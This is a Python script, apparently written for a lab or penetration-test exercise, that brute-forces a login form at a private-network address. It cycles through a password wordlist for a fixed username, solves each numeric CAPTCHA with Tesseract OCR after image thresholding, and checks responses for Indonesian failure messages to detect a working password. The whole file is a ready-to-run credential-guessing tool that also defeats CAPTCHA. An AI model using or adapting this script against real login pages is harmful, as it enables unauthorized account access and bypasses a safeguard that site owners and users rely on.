import requests
from PIL import Image
import pytesseract
from io import BytesIO
from bs4 import BeautifulSoup

# Konfigurasi
url_login = 'http://192.168.70.202:3333/login3.php'
base_url = 'http://192.168.70.202:3333/'
valid_username = 'ilp_test1'
password_file = 'password-wordlists.txt'

pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'

session = requests.Session()

with open(password_file, 'r', encoding='utf-8') as f:
    passwords = [line.strip() for line in f if line.strip()]

def get_captcha():
    try:
        r = session.get(url_login)
        soup = BeautifulSoup(r.text, 'html.parser')
        img_tag = soup.find('img', {'src': lambda x: x and 'captcha.php' in x})
        if not img_tag:
            return None
        captcha_url = base_url + img_tag['src']
        response = session.get(captcha_url)
        image = Image.open(BytesIO(response.content)).convert('L')
        image = image.resize((image.width * 2, image.height * 2))
        image = image.point(lambda x: 0 if x < 150 else 255, '1')
        captcha_text = pytesseract.image_to_string(image, config='--psm 8 -c tessedit_char_whitelist=0123456789')
        return ''.join(filter(str.isdigit, captcha_text))
    except:
        return None

for password in passwords:
    for attempt in range(2):
        captcha = get_captcha()
        if not captcha or len(captcha) < 3:
            print(f"[!] Gagal OCR untuk password: {password}")
            break

        print(f"[{password}] OCR CAPTCHA: {captcha}")

        payload = {
            'username': valid_username,
            'password': password,
            'captcha': captcha
        }

        try:
            resp = session.post(url_login, data=payload)
            body = resp.text
        except Exception as e:
            print(f"[!] Error saat POST: {e}")
            break

        # Cek jika tidak ada indikasi login gagal atau captcha salah
        if all(err not in body.lower() for err in [
            "password salah", "user tidak ditemukan", "captcha salah", "kode captcha", "captcha tidak sesuai"
        ]):
            print(f"[✅] Password kemungkinan benar: {password}")
            exit()
        else:
            print(f"[❌] Password salah: {password}")
            break
